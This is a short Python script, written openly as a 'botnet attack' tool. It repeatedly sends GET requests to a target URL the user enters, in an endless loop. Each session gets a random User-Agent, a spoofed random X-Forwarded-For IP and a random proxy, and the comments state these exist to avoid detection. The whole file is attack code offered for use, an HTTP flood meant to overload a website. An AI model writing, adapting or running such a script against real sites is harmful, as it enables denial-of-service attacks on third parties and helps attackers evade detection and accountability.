import random
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from fake_useragent import UserAgent

def get_random_user_agent():
    ua = UserAgent()
    return ua.random

def get_random_proxy(proxies):
    return random.choice(proxies) if proxies else None

def create_session(user_agents, proxies):
    session = requests.Session()

    # Retry strategy for the session to handle request failures
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504],
        method_whitelist=["HEAD", "GET", "OPTIONS"]
    )

    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # Set random User-Agent to avoid detection
    user_agent = get_random_user_agent() if user_agents else 'Mozilla/5.0'
    session.headers.update({
        'User-Agent': user_agent,
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    })

    # Set proxy if provided
    proxy = get_random_proxy(proxies)
    if proxy:
        session.proxies = {
            'http': proxy,
            'https': proxy,
        }

    return session

def botnet_attack(target_url, proxies, user_agents):
    session = create_session(user_agents, proxies)

    while True:
        try:
            # Simulating botnet attack with random proxies
            response = session.get(target_url)
            if response.status_code == 200:
                print(f"Botnet attack successful from proxy: {session.proxies}")
            else:
                print(f"Error with status code: {response.status_code}")
            time.sleep(random.uniform(0.1, 0.5))
        except requests.exceptions.RequestException as e:
            print(f"Error during Botnet attack: {e}")
            continue

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    proxies = ['proxy1', 'proxy2', 'proxy3']  # Replace with actual proxies
    user_agents = ['Mozilla/5.0', 'Chrome/58.0']  # Replace with actual user agents

    # Start the botnet attack
    botnet_attack(target_url, proxies, user_agents)
